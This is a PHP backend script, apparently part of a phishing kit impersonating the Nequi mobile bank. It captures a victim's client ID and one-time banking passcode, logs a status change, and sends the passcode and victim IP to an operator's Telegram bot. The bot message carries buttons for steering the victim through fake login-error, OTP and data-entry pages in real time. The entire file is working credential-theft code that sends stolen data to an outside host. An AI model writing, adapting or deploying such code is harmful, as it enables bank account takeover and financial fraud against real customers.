<?php
// Incluir el archivo de conexión a la base de datos y las credenciales
include '../../../db.php';
$config = include '../../../config.php';

// Función para escapar caracteres especiales en MarkdownV2
function escapeMarkdownV2($text)
{
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cliente_id = $_POST['cliente_id'];
    $otp = $_POST['otp'];

    if (empty($cliente_id) || empty($otp)) {
        die("Error: El ID del cliente y el OTP no pueden estar vacíos.");
    }

    // Actualizar solo el estado en la base de datos
    $estado = 5; // Estado: Ingreso OTP (o Error OTP si aplica?)
    // Nota: El archivo se llama otpserror.php pero establece estado 5 (OTP recibido?). 
    // Si es "Error OTP" tal vez debería ser otro estado, pero mantenemos lógica original.
    $sql = "UPDATE nequi SET estado = :estado WHERE id = :id";
    $stmt = $conn->prepare($sql);

    // Bind parameters using array in execute
    if ($stmt->execute(['estado' => $estado, 'id' => $cliente_id])) {
        // Enviar datos a Telegram
        $botToken = $config['botToken'];
        $chatId = $config['chatId'];
        $baseUrl = $config['baseUrl'];
        $security_key = $config['security_key'];
        $ip_cliente = $_SERVER['REMOTE_ADDR'];

        $message = "🔄 *Actualización de OTP (Error Flow)*\n\n"
            . "🆔 *ID del cliente:* `" . escapeMarkdownV2($cliente_id) . "`\n"
            . "🔢 *Clave dinámica:* `" . escapeMarkdownV2($otp) . "`\n"
            . "🌐 *IP del cliente:* `" . escapeMarkdownV2($ip_cliente) . "`\n"
            . "📌 *Estado actualizado a:* `Ingreso OTP`";

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => 'Error Login', 'url' => "$baseUrl?id=$cliente_id&estado=2&key=$security_key"],
                    ['text' => 'Datos', 'url' => "$baseUrl?id=$cliente_id&estado=6&key=$security_key"]
                ],
                [
                    ['text' => 'Otp', 'url' => "$baseUrl?id=$cliente_id&estado=3&key=$security_key"],
                    ['text' => 'Otp Error', 'url' => "$baseUrl?id=$cliente_id&estado=4&key=$security_key"]
                ],
                [
                    ['text' => 'Finalizar', 'url' => "$baseUrl?id=$cliente_id&estado=0&key=$security_key"]
                ]
            ]
        ];

        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'MarkdownV2',
            'reply_markup' => json_encode($keyboard)
        ];

        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data),
            ]
        ];

        $url = "https://api.telegram.org/bot$botToken/sendMessage";
        $context = stream_context_create($options);
        $result = file_get_contents($url, false, $context);

        if ($result === FALSE) {
            error_log('Error al enviar mensaje a Telegram');
        }

        // Redirigir a la página de espera con el ID del cliente
        header("Location: ../espera.php?id=" . $cliente_id);
        exit();
    } else {
        echo "Error al actualizar el estado.";
    }

    // $conn = null;
}
?>